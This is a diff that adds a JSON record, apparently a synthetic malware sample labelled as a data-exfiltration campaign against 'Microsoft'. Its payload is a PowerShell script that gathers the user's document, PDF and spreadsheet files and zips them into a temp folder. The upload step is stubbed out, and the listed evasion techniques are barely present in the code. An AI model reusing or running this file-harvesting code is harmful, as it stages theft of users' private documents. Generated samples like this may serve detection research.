@@ -1,0 +1,11 @@
+{
+  "organization": "Microsoft",
+  "campaign_type": "data_exfiltration",
+  "evasion_techniques": [
+    "string_obfuscation",
+    "polymorphic_code"
+  ],
+  "payload": "# HdwVm0T5mbXLUNxBMkj2\n# Generated: 2025-11-03T12:20:52.709885\n# System: EQtFMdH7yAoCYnx\n# Process: Vo07O48teXEs\n\n\n# Data exfiltration\n$sensitiveFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.pdf, *.xls, *.xlsx -ErrorAction SilentlyContinue | Select-Object -First 10\n\nif ($sensitiveFiles) {\n    $sMgHAcUKZip = \"$env:TEMP\\data.zip\"\n    Compress-Archive -Path $sensitiveFiles.FullName -DestinationPath $sMgHAcUKZip -Force\n    # Upload logic would go here\n}\n",
+  "generated_at": "2025-11-03T12:20:52.709893",
+  "signature": "a9b9a6af4839240acf12e16a3c16b7337603c665e2dddec30eb57fd22114bfb9"
+}
